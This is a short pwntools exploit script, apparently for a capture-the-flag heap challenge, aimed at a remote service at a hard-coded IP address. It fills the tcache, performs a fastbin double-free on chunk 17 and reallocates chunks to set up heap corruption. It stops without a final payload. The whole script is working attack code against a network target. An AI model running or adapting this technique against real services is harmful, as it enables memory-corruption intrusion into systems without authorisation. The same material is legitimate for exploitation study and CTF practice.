from pwn import *

context.log_level = "debug"


def create(io, idx, size=0x78, data=b"A"):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"page? ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"length? ")
    io.sendline(str(size).encode())
    io.recvuntil(b"content? ")
    io.send(data.ljust(size, b"\0"))


def delete(io, idx):
    io.recvuntil(b"> ")
    io.sendline(b"2")
    io.recvuntil(b"page? ")
    io.sendline(str(idx).encode())


io = remote("74.113.234.79", 2222)
for i in range(1, 18):
    create(io, i)

for i in [2, 11, 12, 13, 14, 15, 16]:
    print("free", i)
    delete(io, i)

print("free 17")
delete(io, 17)
print("free 1")
delete(io, 1)
print("free 17 again")
delete(io, 17)

for i in range(30, 37):
    print("alloc", i)
    create(io, i)

print("alloc 37")
create(io, 37)
print("done")
